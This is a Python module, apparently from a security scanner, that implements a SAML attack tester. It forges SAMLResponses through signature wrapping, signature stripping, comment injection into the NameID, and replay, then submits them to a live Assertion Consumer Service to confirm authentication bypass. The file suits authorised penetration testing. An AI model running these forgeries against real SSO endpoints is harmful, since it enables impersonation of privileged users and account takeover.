"""Dedicated SAML attack tester.

Most scanners stop at "a SAMLResponse is present". This module *demonstrates*
exploitation: it tampers with a sample SAMLResponse and replays each variant
against a real ACS (Assertion Consumer Service), confirming a flaw ONLY when the
server's accept/deny decision proves the tamper worked — an authenticated
session is issued under an attacker-chosen identity where a control tamper is
rejected. It never treats mere reflection of a value as a finding.

Four classic, high-yield SAML techniques, each with a DETERMINISTIC oracle:

  * xml_signature_wrapping (XSW) — smuggle a forged, attacker-NameID assertion
        alongside the original signed one. Confirmed only if the ACS grants a
        session under the *attacker* NameID while a naive NameID swap (which
        breaks the signature) is rejected.
  * unsigned_assertion — strip/alter the <Signature> and swap the NameID.
        Confirmed only if the ACS accepts the now-unsigned attacker assertion.
  * assertion_replay — resubmit the *same* assertion twice. Confirmed only if
        both submissions are accepted (no one-time/replay cache enforced).
  * comment_injection — inject an XML comment into the NameID
        (admin@corp<!---->.evil) so a naive text extractor resolves the victim
        prefix. Confirmed only if the ACS grants a session as the *victim*
        identity from an attacker-owned subject.

Confirmation is always an objective accept-vs-reject differential (status /
redirect / session cookie issued under the chosen identity), never reflection.
All payloads are inert XML string manipulations — no live signing, no exploits
beyond the target ACS's own decision.
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import httpx

# ---- namespace-agnostic element matchers (SAML uses varied prefixes) --------
_NAMEID_RE = re.compile(r"(<(?:\w+:)?NameID\b[^>]*>)(.*?)(</(?:\w+:)?NameID>)", re.DOTALL)
_SIG_RE = re.compile(r"<(?:\w+:)?Signature\b.*?</(?:\w+:)?Signature>", re.DOTALL)
_ASSERTION_RE = re.compile(r"<(?:\w+:)?Assertion\b.*?</(?:\w+:)?Assertion>", re.DOTALL)
_ID_ATTR_RE = re.compile(r'(\bID=")([^"]*)(")')


@dataclass
class SAMLFinding:
    technique: str  # xml_signature_wrapping | unsigned_assertion |
    # assertion_replay | comment_injection
    confirmed: bool
    detail: str
    attacker_identity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    tampered_response: str = ""  # base64-encoded tampered SAMLResponse


@dataclass
class _SubmitResult:
    granted: bool  # server issued an authenticated session
    status: int
    blob: str  # searchable: body + Location + Set-Cookie

    def identity_in(self, value: str) -> bool:
        return bool(value) and value in self.blob


class SAMLTester:
    """Replay tampered SAMLResponses against an ACS and confirm real flaws.

    Parameters
    ----------
    acs_url : str
        The Assertion Consumer Service endpoint that consumes the SAMLResponse.
    saml_response : str
        A sample SAMLResponse — either raw XML or base64-encoded (auto-detected).
    victim_nameid : str
        The privileged identity an attacker wants to impersonate (used by the
        comment-injection oracle as the resolvable prefix).
    attacker_nameid : str
        A sentinel identity the attacker controls; if the ACS honours it we know
        the forgery was accepted (not merely echoed).
    client : Optional[httpx.AsyncClient]
        Injected client for offline testing (e.g. httpx.MockTransport). When
        supplied it is used as-is and NOT closed by this tester.
    """

    def __init__(
        self,
        acs_url: str,
        saml_response: str,
        *,
        victim_nameid: str = "admin@corp.example",
        attacker_nameid: str = "osop-attacker@evil.test",
        comment_suffix: str = ".evil.example",
        relay_state: Optional[str] = None,
        param: str = "SAMLResponse",
        method: str = "POST",
        timeout: float = 15.0,
        client: Optional[httpx.AsyncClient] = None,
    ):
        self.acs_url = acs_url
        self.raw = saml_response
        self.victim_nameid = victim_nameid
        self.attacker_nameid = attacker_nameid
        self.comment_suffix = comment_suffix
        self.relay_state = relay_state
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self._client = client
        self.xml = self._decode(saml_response)

    # ---- encoding helpers ----------------------------------------------------
    @staticmethod
    def _decode(data: str) -> str:
        s = data.strip()
        if s.startswith("<"):
            return s
        try:
            return base64.b64decode(s).decode("utf-8", "replace")
        except Exception:
            return s

    @staticmethod
    def _encode(xml: str) -> str:
        return base64.b64encode(xml.encode()).decode()

    # ---- tamper primitives ---------------------------------------------------
    @staticmethod
    def _set_nameid(xml: str, new: str) -> str:
        return _NAMEID_RE.sub(lambda m: m.group(1) + new + m.group(3), xml, count=1)

    @staticmethod
    def _first_nameid(xml: str) -> str:
        m = _NAMEID_RE.search(xml)
        return m.group(2) if m else ""

    @staticmethod
    def _strip_signature(xml: str) -> str:
        return _SIG_RE.sub("", xml)

    def _variant_control(self) -> str:
        """Naive NameID swap that leaves the (now-mismatched) Signature in place.

        Any server that validates signatures rejects this — it is the baseline
        that proves the server does *some* validation, so an accept on a real
        technique is a genuine bypass, not an "accepts-everything" server.
        """
        return self._set_nameid(self.xml, self.attacker_nameid)

    def _variant_unsigned(self) -> str:
        """Remove the Signature entirely and stamp the attacker NameID."""
        return self._set_nameid(self._strip_signature(self.xml), self.attacker_nameid)

    def _variant_xsw(self) -> str:
        """XML Signature Wrapping: prepend a forged, unsigned attacker assertion
        (new ID, signature stripped) as a sibling of the original SIGNED
        assertion, which is left untouched so its signature still validates.

        A server that validates the signature over the original assertion but
        then reads identity from the *first* assertion is fooled into
        authenticating the attacker.
        """
        m = _ASSERTION_RE.search(self.xml)
        if not m:
            return self.xml
        original = m.group(0)
        forged = self._strip_signature(original)
        forged = self._set_nameid(forged, self.attacker_nameid)
        forged = _ID_ATTR_RE.sub(r"\1_forged_\2\3", forged, count=1)
        # Insert the forged assertion immediately before the original signed one.
        return self.xml.replace(original, forged + original, 1)

    def _comment_injected_nameid(self) -> str:
        return f"{self.victim_nameid}<!---->{self.comment_suffix}"

    def _variant_comment(self) -> str:
        """Inject an XML comment into the NameID: victim<!---->suffix.

        The full subject (attacker-owned) is what would be signed, but a naive
        text extractor that stops at / ignores the comment resolves the victim
        prefix — granting the attacker the victim's identity.
        """
        return self._set_nameid(self.xml, self._comment_injected_nameid())

    # ---- replay / confirmation ----------------------------------------------
    async def _submit(self, client: httpx.AsyncClient, xml: str) -> _SubmitResult:
        """POST a tampered SAMLResponse and read the accept/deny decision.

        Granted == the ACS issued a session (2xx/3xx AND a Set-Cookie), i.e. an
        objective authentication grant — not mere reflection of a value.
        """
        data = {self.param: self._encode(xml)}
        if self.relay_state:
            data["RelayState"] = self.relay_state
        try:
            resp = await client.request(self.method, self.acs_url, data=data)
        except Exception:
            return _SubmitResult(granted=False, status=0, blob="")
        set_cookie = resp.headers.get("set-cookie", "")
        location = resp.headers.get("location", "")
        granted = resp.status_code in (200, 302, 303) and bool(set_cookie)
        blob = f"{resp.text} {location} {set_cookie}"
        return _SubmitResult(granted=granted, status=resp.status_code, blob=blob)

    async def run(self) -> List[SAMLFinding]:
        if self._client is not None:
            return await self._run(self._client)
        async with httpx.AsyncClient(
            verify=False, follow_redirects=False, timeout=self.timeout
        ) as client:
            return await self._run(client)

    async def _run(self, client: httpx.AsyncClient) -> List[SAMLFinding]:
        findings: List[SAMLFinding] = []

        # Baseline control: a naive NameID swap. On any server that validates
        # signatures this MUST be rejected (or at least not grant the attacker).
        control = await self._submit(client, self._variant_control())
        control_bypasses = control.granted and control.identity_in(self.attacker_nameid)

        # 1) XML Signature Wrapping ------------------------------------------------
        xsw_xml = self._variant_xsw()
        xsw = await self._submit(client, xsw_xml)
        if xsw.granted and xsw.identity_in(self.attacker_nameid) and not control_bypasses:
            findings.append(
                SAMLFinding(
                    technique="xml_signature_wrapping",
                    confirmed=True,
                    detail=(
                        "ACS granted a session under the attacker NameID from a "
                        "wrapped forged assertion, while a naive NameID swap was "
                        "rejected — signature is validated over the original "
                        "assertion but identity is read from the forged one."
                    ),
                    attacker_identity=self.attacker_nameid,
                    evidence={
                        "status": xsw.status,
                        "control_status": control.status,
                        "control_bypasses": control_bypasses,
                    },
                    tampered_response=self._encode(xsw_xml),
                )
            )

        # 2) Unsigned / stripped-signature assertion -------------------------------
        uns_xml = self._variant_unsigned()
        uns = await self._submit(client, uns_xml)
        if uns.granted and uns.identity_in(self.attacker_nameid) and not control_bypasses:
            findings.append(
                SAMLFinding(
                    technique="unsigned_assertion",
                    confirmed=True,
                    detail=(
                        "ACS accepted an assertion with its Signature removed and "
                        "an attacker NameID — signatures are not enforced."
                    ),
                    attacker_identity=self.attacker_nameid,
                    evidence={"status": uns.status, "control_status": control.status},
                    tampered_response=self._encode(uns_xml),
                )
            )

        # 3) Comment-injection NameID confusion ------------------------------------
        cmt_xml = self._variant_comment()
        cmt = await self._submit(client, cmt_xml)
        # Confirmed only if the server resolved the *victim* prefix (attacker
        # gains victim identity) rather than the full attacker-owned subject.
        if (
            cmt.granted
            and cmt.identity_in(self.victim_nameid)
            and not cmt.identity_in(self._comment_injected_nameid())
            and not control_bypasses
        ):
            findings.append(
                SAMLFinding(
                    technique="comment_injection",
                    confirmed=True,
                    detail=(
                        "ACS resolved the NameID up to an injected XML comment, "
                        f"granting a session as the victim '{self.victim_nameid}' "
                        "from an attacker-owned subject — canonicalization/parser "
                        "confusion."
                    ),
                    attacker_identity=self.victim_nameid,
                    evidence={
                        "status": cmt.status,
                        "injected_nameid": self._comment_injected_nameid(),
                    },
                    tampered_response=self._encode(cmt_xml),
                )
            )

        # 4) Assertion replay ------------------------------------------------------
        first = await self._submit(client, self.xml)
        if first.granted:
            second = await self._submit(client, self.xml)
            if second.granted:
                findings.append(
                    SAMLFinding(
                        technique="assertion_replay",
                        confirmed=True,
                        detail=(
                            "ACS accepted the identical assertion twice — no "
                            "one-time-use / replay cache is enforced."
                        ),
                        attacker_identity=self._first_nameid(self.xml),
                        evidence={"first_status": first.status, "second_status": second.status},
                        tampered_response=self._encode(self.xml),
                    )
                )

        return findings
